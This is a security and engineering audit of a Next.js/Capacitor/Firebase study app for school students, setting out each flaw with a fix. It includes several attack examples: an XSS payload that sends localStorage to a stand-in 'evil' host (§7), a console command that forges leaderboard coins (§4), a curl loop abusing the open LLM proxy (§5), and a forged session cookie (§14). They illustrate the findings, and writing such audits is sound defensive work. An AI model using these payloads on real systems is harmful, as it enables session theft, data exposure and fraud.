# SKCTI — Full Audit

Repo: `github.com/ParthSancheti/SKCTI` · Next.js 14.2.35 + Capacitor 8 + Firebase
Reviewed: clone, install, production build, static analysis, and a walkthrough of every route as both a normal student and someone poking at it.

The glass design language is untouched in every fix below. Nothing here changes a colour, a gradient, or a blur value on a capable device.

---

## The five-minute version

The app doesn't install, three of its four API routes don't exist in production, any student can read every classmate's phone number, and 78 elements are rendering at four times their intended corner radius. Fixing those five things gets you most of the way to the app you think you already have.

| # | Issue | Where | Impact |
|---|---|---|---|
| 1 | `npm install` fails on a clean clone | `package.json` | Nobody can build it |
| 2 | `output: 'export'` silently deletes all API routes + middleware | `next.config.mjs` | AI Lab and day planner have never worked in production |
| 3 | Any signed-in student can read every user doc | `firestore.rules:78` | Phone numbers + emails of every minor, exposed |
| 4 | Any student can set `coins: 999999` from the console | `firestore.rules:81` | Leaderboard is decorative |
| 5 | `/api/chat` is an open, unauthenticated LLM proxy | `app/api/chat/route.ts` | Anyone can spend your Groq balance |
| 6 | `rounded-xl` renders at 48px instead of 12px, 78 times | `tailwind.config.ts:53` | The main reason it looks "off" |
| 7 | Background burns GPU continuously and is mounted 2–3× | `MeshBackground.tsx` | The main reason it feels slow |
| 8 | No `viewport` export, so safe-area insets always read 0px | `app/layout.tsx` | Content under the notch on every phone |

---

# P0 — Broken right now

## 1. A clean clone cannot be installed

```
$ git clone … && npm install
npm error ERESOLVE could not resolve
npm error peer @capacitor/core@"^6.0.0" from @codetrix-studio/capacitor-google-auth@3.4.0-rc.4
npm error Found: @capacitor/core@8.4.2
```

`@codetrix-studio/capacitor-google-auth` is pinned to an `-rc` prerelease that peer-depends on Capacitor 6. Your project is on Capacitor 8. Every install needs `--legacy-peer-deps`, which means npm is resolving a combination nobody tested — and Google Sign-In is the thing it's resolving.

`@codetrix-studio` has been community-maintained and lagging for a while. The supported path now is the official plugin:

```bash
npm uninstall @codetrix-studio/capacitor-google-auth
npm install @capacitor-community/google-signin   # or firebase/auth native flow
```

If you'd rather not migrate today, pin it explicitly and commit the reason:

```json
"overrides": { "@codetrix-studio/capacitor-google-auth": { "@capacitor/core": "$@capacitor/core" } }
```

Either way this must not stay as-is — an `-rc.4` prerelease is holding up the login path for your entire user base.

## 2. `output: 'export'` has been deleting your backend

`next.config.mjs:3`

```js
const nextConfig = { output: 'export', … };
```

Next 14 does not error on this. It just drops anything that needs a server. I built the repo and checked:

```
$ ls -R out | grep -i api
(nothing)
```

Gone from production:

- `app/api/plan/route.ts` — the AI day planner
- `app/api/chat/route.ts` — the entire AI Lab
- `app/api/ai/route.ts` — never called by any page anyway (see §22)
- `app/api/cron/check-tasks/route.ts`
- `middleware.ts` — all 26.7 kB of route protection, not emitted

Now trace what a student experiences. `app/(student)/home/page.tsx:86`:

```js
const r = await fetch("/api/plan", { … });
const data = await r.json();          // ← 404 page is HTML, this throws
```

The throw lands in the catch, which sets `planErr`. And `planErr` is **never rendered anywhere in the file**. So Today's Focus fails completely silently, on every device, every day, and has done since the flag was added.

**Fix:** `next.config.mjs` in `skcti-fixes/`. Removing `output: 'export'` restores the routes and the middleware in one line. Capacitor already points at the live URL, so the native app picks it up with no other change.

## 3. Every student can read every other student's phone number

`firestore.rules:78`

```
match /users/{uid} {
  allow read: if signedIn();   // "necessary for Leaderboards"
```

It isn't necessary, and the cost is severe. `app/(student)/rank/page.tsx:17` runs:

```js
query(col.users(), orderBy("coins", "desc"), limit(50))
```

That streams **entire user documents** into every student's browser. From `lib/types.ts:44`, a `UserDoc` contains `email`, `phone`, `name`, plus `downloads`, `attempted` and `doneTasks`. The rank page displays a name and a coin count; the other fifty fields ride along regardless.

So any student opens DevTools on the Rank tab and reads the personal mobile number of the top 50 students in the batch. These are 11th and 12th standard students — minors. Collected at onboarding with the promise "For rank alerts & account recovery" (`app/onboarding/page.tsx:52`). No verification, no consent screen, no deletion path.

Treat this as the finding to fix first. It's not a theoretical exploit; it's one tab in DevTools.

**Fix:** hardened `firestore.rules` in `skcti-fixes/`. Reads collapse to self-or-admin, and the leaderboard moves to a `/leaderboard/{uid}` projection carrying only `displayName`, `photo`, `coins`, `streak`.

## 4. Coins and streaks are client-writable with no validation

`firestore.rules:81`

```
allow create, update: if signedIn() && request.auth.uid == uid;
```

No field allowlist, no value constraints. From the browser console of any logged-in student:

```js
updateDoc(doc(db, "users", auth.currentUser.uid), { coins: 999999, streak: 500 })
```

Top of the leaderboard, permanently. Every coin in the app — +50 signup, +10 per task, +25 per test — is advisory.

The rules file in `skcti-fixes/` adds `coinsSane()` (monotonic, max +100 per write) and `streakSane()` (+1 or reset), plus a field allowlist so `email` and `createdAt` can't be rewritten. `increment()` calls from the real app pass; console edits don't.

## 5. `/api/chat` is an open LLM proxy on your card

`app/api/chat/route.ts` — no auth check, no rate limit, no origin check, no input cap. Once §2 is fixed and the route actually deploys, this becomes:

```bash
curl -X POST https://skcti-lyart.vercel.app/api/chat \
     -H 'Content-Type: application/json' \
     -d '{"prompt":"write a 5000 word essay"}'
```

in a `while true` loop, on your Groq balance, from anyone. `/api/plan` is identical.

Two more problems in the same file:

- **Line 51** returns Groq's raw error body to the browser: `{ error: "Groq API Error", details: errorText }`. Provider error bodies echo request metadata. Never forward them.
- **Line 60** `data.choices[0]?.message?.content` — indexed with no length check, and `JSON.parse` on the result is unguarded.

**Fix:** `skcti-fixes/app/api-chat-route.ts` — Firebase ID token verification, 12 requests/minute/uid, 2000-char prompt cap, sanitised errors, and validated `action_items` before they hit Firestore.

## 6. `/api/cron/check-tasks` has its auth commented out

`app/api/cron/check-tasks/route.ts:11-14`

```js
// const authHeader = req.headers.get('authorization');
// if (authHeader !== `Bearer ${process.env.CRON_SECRET}`) {
```

Harmless today because the body is entirely commented out too. But it's a publicly callable endpoint with the guard already disabled, waiting for someone to uncomment the logic and not the guard. Either delete the file or restore the check now, while it's still free to do.

## 7. `dangerouslySetInnerHTML` on admin-controlled content

`app/(student)/home/page.tsx:196`

```jsx
if (config.customBlocks?.[id])
  return <div key={id} dangerouslySetInnerHTML={{ __html: config.customBlocks[id] }} />;
```

`config/app` is admin-writable. Anything in `customBlocks` executes as HTML in every student's session, with access to the Firebase ID token sitting in IndexedDB. A single `<img src=x onerror="fetch('https://evil/'+localStorage)">` in that field harvests the session of every student who opens Home.

The exposure is wider than "trust your admins":

- `firestore.rules:27` — `allow create: if signedIn() && !exists(config/app)`. If that doc is ever deleted, the **next student to load the app** can create it, name themselves admin, and write `customBlocks`.
- `firestore.rules:22` — `allow read: if true` on `config/app`. The admin email list is world-readable by anyone who knows the project ID. That's a targeting list.

**Fix:** either sanitise with DOMPurify, or restrict `customBlocks` to a small allowlist of markup shapes. The rules file also splits public branding into `/public/branding` so `adminEmails` stops being world-readable.

## 8. The chat-history listener has no matching Firestore rule

`lib/store.tsx:172`

```js
onSnapshot(doc(fbDb(), "users", fbUser.uid, "private", "chat"), …)
```

Firestore rules do **not** cascade into subcollections. `firestore.rules` declares `users/{uid}/aiChats` and `users/{uid}/todos`, but nothing for `users/{uid}/private/*`. Every session opens that listener and gets permission-denied — and there's no error callback on this one, so it fails into the console and `chatHistory` stays empty forever.

Added in the fixed rules as `match /private/{docId}`.

---

# P1 — Scaling. What breaks at 100 users

You asked specifically about 100 concurrent students. Here's what gives way, in order.

## 9. Every student downloads every document in the database

`array-contains` is **never used anywhere in this codebase**. Every stream filter happens client-side, after the download:

| File | Line | Query |
|---|---|---|
| `home/page.tsx` | 53 | all announcements → `.filter(streams.includes)` |
| `home/page.tsx` | 64 | all banners → `.filter(…)` |
| `home/page.tsx` | 69 | all content → `.filter(…)` |
| `learn/page.tsx` | 58 | all content → `.filter(…)` |
| `learn/page.tsx` | 68 | all videos → `.filter(…)` |
| `tests/page.tsx` | 24 | all tests → `.filter(…)` |

A PCM student downloads every PCB chapter. Then throws it away. These are `onSnapshot` listeners, so it re-runs on every publish.

Run the arithmetic at your target: 300 chapters × 100 students = 30,000 reads just for Home to render once. The Firestore free tier is 50,000 reads/day. You exhaust it before lunch, and every student sees "Library incoming" for the rest of the day because reads start failing.

**Fix — server-side filtering:**

```js
query(col.content(),
  where("published", "==", true),
  where("streams", "array-contains", profile.stream))
```

Same for banners, videos, tests, announcements. Composite indexes required; the Firebase console gives you a one-click link on the first failed query. This is a ~90% cut in read volume on its own.

## 10. The leaderboard is an O(N²) fan-out

`rank/page.tsx:17` — a live `onSnapshot` on the top 50 by coins. When any student in that 50 earns a coin, the query re-fires **for every connected client**. 100 students earning coins through an evening study session is thousands of re-fires, each pushing 50 documents.

Combined with §9, this is what actually takes the app down at scale — not a crash, a quota wall.

**Fix:** move to the `/leaderboard/{uid}` projection (small docs, no PII) and switch from `onSnapshot` to `getDocs` with a manual pull-to-refresh. A leaderboard doesn't need to be realtime; a "Refresh" affordance is honest and costs 1/1000th as much.

## 11. The admin dashboard streams the entire users collection

`app/admin/page.tsx:92`

```js
onSnapshot(col.users(), (s) => setUsers(s.docs.map(…)))
```

No `limit()`. Used to display a count and an "active today" number. Every streak write by every student re-triggers it. At 1,000 users an admin leaving the dashboard open on a second monitor is a standing bill.

**Fix:** `getCountFromServer(col.users())` for the count, and a `stats/daily` counter doc maintained by a Cloud Function for "active today". Lines 93–95 (`content`, `tests`, `banners`) have the same problem and the same fix.

## 12. No Firestore offline persistence

`lib/firebase.ts:24` — `getFirestore(getApp())` with default settings. In a native app that means: no network, no data, not even the chapters the student opened an hour ago. This is the difference between "my app is offline" and "my app has no internet".

```js
import { initializeFirestore, persistentLocalCache, persistentMultipleTabManager } from "firebase/firestore";

export const fbDb = () => initializeFirestore(getApp(), {
  localCache: persistentLocalCache({ tabManager: persistentMultipleTabManager() }),
});
```

One change, and it also absorbs a large fraction of the read volume from §9 and §10.

## 13. Base64 images are written into Firestore chat documents

`ai/page.tsx:83` builds `userMsg` with the full data-URL, then `ai/page.tsx:131` writes the entire message array into one document. Firestore's hard document limit is **1 MiB**. Three photos of a physics problem and the write fails.

It fails inside a `try` whose catch only sets a chat bubble to "Something went wrong on the network" — so the student sees a network error for a size problem, retries, and fails again permanently. The chat is now unrecoverable.

Upload to Firebase Storage, store the URL. Or drop the image field before persisting.

---

# P2 — Security, beyond the rules

## 14. The middleware auth gate is spoofable, and also doesn't run

`middleware.ts:5` checks `request.cookies.get('skcti_session')`. That cookie is set client-side in `lib/store.tsx:105`:

```js
document.cookie = "skcti_session=true; path=/; max-age=86400";
```

A plain, non-HttpOnly, unsigned string. Typing `document.cookie="skcti_session=true"` in the console satisfies the entire gate. It's a string equality check against a value the client controls.

It happens not to matter, because `output: 'export'` means the middleware isn't deployed at all (§2). But once you fix §2 it will start running, and it will be doing nothing. Delete the file, or replace it with a real Firebase session cookie verified server-side. Don't leave a check that looks like security and isn't.

## 15. Capacitor allows navigation to any URL on the internet

`capacitor.config.ts:9-16`

```ts
allowNavigation: ["*.vercel.app", "*.firebaseapp.com", "*.googleapis.com", "*"]
```

The trailing `"*"` makes every entry above it decoration. Any URL — from an announcement, a banner CTA, a Drive redirect — loads full-screen inside your WebView, wrapped in your app chrome, with no address bar for the student to check. That is a phishing surface you're shipping.

`cleartext: true` on line 8 permits plain `http://`. On school or café wifi that's a straightforward downgrade-and-inject against a WebView holding a live Firebase session.

`webDir: 'public'` is also wrong — the Next static bundle lands in `out/`. If `server.url` is ever unreachable the app falls back to a directory containing images and a manifest, i.e. a blank white screen.

**Fix:** `skcti-fixes/capacitor.config.ts`.

## 16. No security headers

No CSP, no `X-Frame-Options`, no HSTS, no `Referrer-Policy`. A CSP is the mitigation that turns §7 from "session theft" into "a script that can't phone home". Added in `skcti-fixes/next.config.mjs`.

## 17. PDF and form iframes are unsandboxed

`PdfViewerModal.tsx:44`, `learn/read/page.tsx:114`, `learn/test/page.tsx`. `drivePreviewUrl()` is safe (`lib/types.ts:197` templates into `drive.google.com`), but `formEmbedUrl()` at line 202 returns the **raw input unchanged** when `new URL()` throws, and never checks the host is Google. Add `sandbox="allow-scripts allow-same-origin allow-popups allow-forms"` and validate the host before embedding.

Also: `learn/read/page.tsx:110` has `onContextMenu={(e) => e.preventDefault()}` on the iframe. Cross-origin iframes don't propagate events to the parent. It does nothing.

## 18. Onboarding loads a third-party image on a screen shown to minors

`app/onboarding/page.tsx:167` — a hardcoded `images.unsplash.com` URL. Every new student's device makes a request to a third party during signup, and if that request fails (offline native cold start) the signup screen shows a broken image. Download it into `public/`.

---

# P3 — UI bugs. Pinpointed

## 19. `rounded-xl` renders at 48px instead of 12px, in 78 places

This is the one you can see, and it's four lines of config.

`tailwind.config.ts:53`

```ts
borderRadius: {
  sm: "0.5rem", DEFAULT: "1rem", md: "1.5rem",
  lg: "2rem",   xl: "3rem",
  glass: "32px", input: "12px",
}
```

Those aren't new names. They **overwrite Tailwind's built-in scale**:

| Class | Tailwind | Yours | Factor |
|---|---|---|---|
| `rounded-sm` | 2px | 8px | 4× |
| `rounded` | 4px | 16px | 4× |
| `rounded-md` | 6px | 24px | 4× |
| `rounded-lg` | 8px | 32px | 4× |
| `rounded-xl` | **12px** | **48px** | **4×** |

Counted in the repo: `rounded-xl` × 78, `rounded-lg` × 6, `rounded-sm` × 4.

Where you can see it:

- `admin/layout.tsx:63` — `w-14 h-14 rounded-xl` on the logo. 48px radius on a 56px box is a **circle**. It was written to be a squircle.
- `TitleBar.tsx:100` — profile menu rows, `rounded-xl` on ~40px rows → lozenges.
- `admin/layout.tsx:238` — `rounded-lg` on small label chips → 32px radius on a 24px-tall pill.

Fixed config in `skcti-fixes/tailwind.config.ts`: Tailwind's scale restored, oversized values kept under `rounded-glass` / `rounded-squircle` / `rounded-card`. After swapping, grep `rounded-xl` and promote the handful that were genuinely large cards.

## 20. Safe-area insets have never worked

Two compounding problems.

**a)** `app/layout.tsx` has **no `viewport` export at all**. Without `viewport-fit=cover`, `env(safe-area-inset-*)` returns `0px` on every device. So the safe-area maths that *does* exist — `TitleBar.tsx:39`, `TitleBar.tsx:86`, `app/page.tsx:201/204/257/273/540` — has been resolving to its fallback this whole time. The CSS looks right and does nothing.

**b)** `lib/store.tsx:117` calls `StatusBar.setOverlaysWebView({ overlay: true })`, so the WebView deliberately draws under the status bar and the gesture bar. Everything must compensate. Most things don't:

| Element | File:line | Current | Problem |
|---|---|---|---|
| Bottom nav | `BottomNav.tsx:30` | `bottom-6` | Sits in the Android gesture strip; swipe-up eats taps on Rank |
| AI FAB | `AiFab.tsx:20` | `bottom-28` | Same |
| PDF reader back | `learn/read/page.tsx:80` | `top-4 left-4` | Under the status bar |
| Admin header | `admin/layout.tsx:143` | `fixed top-0 p-4` | Under the status bar |
| Admin FAB | `admin/layout.tsx:214` | `bottom-6 right-6` | In the gesture strip |
| Rank "you" row | `rank/page.tsx:89` | `sticky bottom-28` | Collides with the nav blur |

Fixed by the `viewport` export in `skcti-fixes/app/layout.tsx` plus the `--sat`/`--sab` tokens in `skcti-fixes/app/globals-native-additions.css`.

## 21. The theme transition is dead code

`app/globals.css:236` defines the animation trigger as:

```css
#theme-overlay.expanding { clip-path: circle(150% at 85% 10%); }
```

`lib/store.tsx:210` adds a different class:

```js
overlay.classList.add("theme-overlay-run");
```

They never match. The Telegram-style circular theme wipe has never rendered — you get the 250ms `setTimeout` delay before the theme swaps, with no animation to fill it, so it just feels laggy.

And even with matching names it wouldn't run: `ThemeOverlay.tsx:5` ships the element with `className="no-transition"`, which sets `transition: none` and is never removed.

Both handled in the native CSS layer.

## 22. Dead buttons a student will actually tap

- **`learn/read/page.tsx:100`** — the "Ask AI" button on the PDF reader is `onClick={() => vibrate(10)}`. It buzzes and does nothing. A student reading a chapter, stuck, taps the button literally labelled Ask AI, and the phone vibrates at them.
- **`admin/layout.tsx:110`** — `<button>` nested inside `<Link href="/home">`. Invalid HTML, and the LogOut button has no `onClick` — tapping it navigates to Home. **There is no working sign-out in the admin panel.**
- **`admin/layout.tsx:229`** — `alert("Add Notice (Coming Soon)")`.

## 23. Twelve `alert()` calls in production

`admin/page.tsx` ×3, `content/edit` ×2, `content/add` ×2, `tests/add` ×2, `builder` ×1, `admin/layout` ×1, `settings/page.tsx:75`.

In a Capacitor WebView a native `alert()` renders a system dialog reading **"skcti-lyart.vercel.app says:"**. Your app announces that it's a website, in a modal, in the admin panel, in front of your teachers. Replace with a glass toast — you already have the visual language for it.

## 24. `/api/ai` is fully built and never called

74 lines implementing streaming, multimodal Gemini doubt-solving. No page fetches it. Meanwhile `ai/page.tsx:96` calls `/api/chat`, which is non-streaming Groq text-only.

Consequence: `ai/page.tsx:70` captures a photo, shows it in the chat bubble — and **never sends it**. `/api/chat` only receives `{ prompt, context }`. A student photographs a problem, sees it attached, gets an answer to nothing. The multimodal backend you already wrote is sitting right there, unwired.

Also note `/api/plan/route.ts:5` declares `const MODEL = process.env.GEMINI_MODEL` and then calls **Groq** with a hardcoded Llama model. `.env.example` documents `GEMINI_API_KEY` and `GEMINI_MODEL`; the route reads `GROQ_API_KEY`, which appears nowhere in `.env.example`. Anyone following your README ends up with a planner that 500s.

## 25. `MeshBackground` is mounted two to three times at once

Rendered in `app/layout.tsx:31`, and again in `admin/layout.tsx:141`, `app/page.tsx:198`, `onboarding/page.tsx:161`, `login/page.tsx:17`.

On the landing page and in admin, **two or three complete copies** of the animated background run simultaneously. Each copy is four orbs up to 120vw square at `blur(100px)`, each `animate-spin`, inside a parent running `filter: hue-rotate()` on a 20s loop.

That parent filter is the expensive part: a filter on a container forces the entire subtree to re-rasterise every frame, defeating every optimisation underneath. Add `mix-blend-multiply` on each orb and you have several full-screen blend passes per frame, forever, never pausing when backgrounded.

This is the single largest reason the app doesn't feel native. `skcti-fixes/components/MeshBackground.tsx` reproduces the same look with radial gradients and one compositor-only transform — no blur filters, no blend modes, no hue-rotate, and it self-suspends when hidden.

## 26. Nested `backdrop-filter` in the bottom nav

`BottomNav.tsx:30` — nav has `backdrop-blur-3xl`. `BottomNav.tsx:37` — the active pill inside it has `backdrop-blur-[60px]`. The inner filter samples the already-blurred parent: visually muddy, roughly double the cost, on the one element on screen 100% of the time.

## 27. The active nav pill teleports instead of sliding

`BottomNav.tsx:35-50` renders a different DOM node per tab, so there's nothing for the browser to animate between. Native tab bars morph. Adding `layoutId="nav-pill"` is a one-line change with an outsized effect on how the app reads.

Fixed in `skcti-fixes/components/BottomNav.tsx`, along with `prefetch` — `router.push` was downloading each route's chunk on tap, so the first visit to each tab stalled visibly.

## 28. Haptics don't exist on iOS

`lib/store.tsx:21` and `:26` both wrap `navigator.vibrate`. That API doesn't exist in an iOS WKWebView. **Every iPhone user has had zero haptics**, silently. `@capacitor/haptics` is installed and used in exactly one file (`HapticRouter.tsx`).

And the durations are wrong everywhere else. `vibrate(50)` on ordinary taps in `TitleBar.tsx` (×6), `home/page.tsx`, `settings/page.tsx`; `vibrate(100)` on the settings easter egg. A native tap is 8–15ms. 50ms is a notification buzz — it reads as the app vibrating *at* the student rather than confirming a tap.

`skcti-fixes/lib/haptics.ts` provides semantic haptics (tap / select / impact / success / warning / error) with real iOS support, plus a drop-in `vibrate()` shim so you can migrate the ~40 call sites gradually.

## 29. `font-geist` falls back to monospace

`tailwind.config.ts:38`

```ts
geist: ["var(--font-geist)", "monospace", "sans-serif"]
```

`monospace` sits **before** `sans-serif`. Whenever the Google Fonts request fails — offline native cold start, slow connection, blocked CDN — every `font-geist` element renders in Courier. That's every coin count, every label, every nav item, every stat.

Compounding it: `app/layout.tsx:21` loads fonts via an external `<link>` in `<head>`, which is a render-blocking third-party request on every cold start. `next/font` self-hosts them into your bundle. Fixed in `skcti-fixes/app/layout.tsx`.

## 30. The PWA manifest is invalid and never loaded

`public/manifest.webmanifest` has only an `icons` array. Missing `name`, `short_name`, `start_url`, `display`, `theme_color`, `background_color` — so it is **not installable**. Chrome will never offer "Add to Home Screen".

Three further faults:

- Every `src` is `"../icons/icon-48.webp"` — a relative path climbing above the web root. Invalid in a manifest.
- The `icons/` directory is at the **repo root**, not in `public/`, so it isn't served at all. Every icon 404s.
- `"type": "image/png"` on files that are `.webp`.

And `app/layout.tsx` never declared `manifest:`, so none of it was ever fetched anyway.

Fixed manifest in `skcti-fixes/public/manifest.webmanifest`. **You must also run `mv icons public/icons`.**

## 31. Smaller things worth a pass

- `app/layout.tsx:11` — `icon: "/src/logo.png"`. Works, but `public/src/` as a directory name will confuse the next person.
- `TitleBar.tsx:47`, `admin/layout.tsx:63` — `<img>` with no width/height → layout shift on every page load.
- `TitleBar.tsx:86` — the profile dropdown is `bg-white dark:bg-neutral-900`, fully opaque. It's the one panel in the app that isn't glass.
- `TitleBar.tsx:72` — `firePortal()` fires a full-screen circle scaling to 40× on **every** menu item tap. Heavy for "open settings".
- `AiFab.tsx:20` — `animate-pulse` runs infinitely on a `shadow-[0_0_40px]` gradient. Continuous repaint on a permanently visible element, and visually restless.
- `rank/page.tsx:82` — students outside the top 50 get no indication of their own rank at all.
- `home/page.tsx` — unused: `SUBJECT_ICONS`, `menuOpen`, `comingSoonTitle`, `completeTask`, `doneCount`, `progress`, `planLoading`, and imports `CoinPill`, `GlassCard`, `ProgressRing`, `firePortal`, plus ~10 icons.
- `home/page.tsx:105` — `generatePlan` reads `chapters` but `chapters` isn't in the effect's dependency array, so the first run always sends an empty chapter list.
- `BottomNav.tsx:9` / `TitleBar.tsx:5` — `useSearchParams()` with no Suspense boundary opts the tree out of static rendering.
- `lib/db.ts:31` — `ensureConfig()` writes `DEFAULT_CONFIG`; `admin/page.tsx:112` writes a different, partial shape. `ensureConfig` is dead. Two divergent init paths.
- `tsconfig.json` declares no `"target"`. `tsc` then defaults to ES5 during type-check, which rejects `for…of` over a `Map` or `Set` without `--downlevelIteration`. Next transpiles with SWC so runtime is fine, but the type-check will reject perfectly valid modern code. Add `"target": "ES2020"`. (Hit this while verifying the fixes.)
- `out/` and `tsconfig.tsbuildinfo` are committed. Add to `.gitignore` and `git rm -r --cached out tsconfig.tsbuildinfo`.
- `.gitignore` starts with a UTF-8 BOM, so the first rule (`node_modules/`) may not match on some tooling.

---

# What's in `skcti-fixes/`

| File | Replaces | Fixes |
|---|---|---|
| `firestore.rules` | root | §3 §4 §7 §8 — PII, coin fraud, subcollections, config lockdown |
| `next.config.mjs` | root | §2 §16 — API routes restored, CSP + security headers |
| `capacitor.config.ts` | root | §15 — wildcard nav, cleartext, wrong webDir |
| `tailwind.config.ts` | root | §19 §29 — the radius bug, the monospace fallback |
| `app/layout.tsx` | `app/layout.tsx` | §20 §29 §30 — viewport, self-hosted fonts, manifest |
| `app/globals-native-additions.css` | append to `app/globals.css` | §20 §21 §25 — safe areas, tap highlight, overscroll, blur tiering |
| `app/api-chat-route.ts` | `app/api/chat/route.ts` | §5 — auth, rate limit, sanitised errors |
| `components/MeshBackground.tsx` | `components/MeshBackground.tsx` | §25 — same look, ~1/20th the GPU |
| `components/BottomNav.tsx` | `components/BottomNav.tsx` | §20 §26 §27 — safe area, sliding pill, prefetch, a11y |
| `lib/haptics.ts` | new file | §28 — real iOS haptics, correct durations |

Every file carries inline comments explaining what was wrong and why, so the reasoning survives even if the code gets rewritten.

---

# Suggested order

**Today** — the ones that are live problems:
1. Deploy the hardened `firestore.rules` (§3, §4). Phone numbers stop leaking the moment you hit Publish.
2. Drop `output: 'export'` (§2). The AI Lab and planner come back.
3. Deploy the secured `/api/chat` (§5) before §2 makes the route reachable. **Order matters here.**
4. `mv icons public/icons` + the fixed manifest (§30).

**This week** — the ones that decide whether 100 users works:
5. `array-contains` on all six queries (§9).
6. Firestore offline persistence (§12).
7. The leaderboard projection (§10).
8. Bound the admin listeners (§11).

**Then** — the ones that decide whether it feels native:
9. `tailwind.config.ts` + sweep `rounded-xl` (§19). Biggest visible win per minute spent.
10. `MeshBackground` + delete the duplicate mounts (§25).
11. The viewport export and safe-area pass (§20).
12. `lib/haptics.ts`, then migrate the `vibrate(50)` calls (§28).
13. Wire the camera to `/api/ai` (§24) and fix the Ask AI button (§22).

---

# On "native app, not webapp"

The fixes above remove the tells — tap highlights, text selection, pull-to-refresh, 50ms buzzes, teleporting nav pills, monospace fallbacks, `alert()` dialogs that print your domain name.

But one architectural decision sets the ceiling, and it's in `capacitor.config.ts:6-7`:

```ts
webDir: 'public',
server: { url: 'https://skcti-lyart.vercel.app/' }
```

`server.url` means the native app is a WebView pointed at your website. Every cold start is DNS + TLS + HTML + JS over the network before the first pixel. On Indian 4G that's 2–4 seconds of white screen where a native app renders in under 400ms. No network means no app — not even a shell.

It's also a Google Play risk. "App is a wrapper for a website" falls under the Minimum Functionality policy and is a common rejection reason.

The fix is to bundle the UI on-device and call the API remotely:

1. Keep `output: 'export'` **off** for the Vercel deploy so `/api/*` works.
2. Add a second build with `output: 'export'` on, for the Capacitor shell.
3. Call `${process.env.NEXT_PUBLIC_API_BASE}/api/chat` instead of relative `/api/chat`.
4. Delete the `server` block. Capacitor serves `out/` from the device.

One codebase. Instant launch. Works on the bus with no signal, because Firestore's offline cache (§12) covers the data. That's the actual gap between what you have and what you're describing.
